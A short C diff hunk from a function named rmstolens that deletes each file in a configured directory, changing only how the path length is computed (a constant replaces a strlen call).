@@ -12,7 +12,7 @@ void rmstolens(void){
         if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
             continue;
 
-        pathlen = strlen(INTEREST_DIR) + strlen(dir->d_name) + 2;
+        pathlen = LEN_INTEREST_DIR + strlen(dir->d_name) + 2;
         char path[pathlen];
         snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
         call(CUNLINK, path);
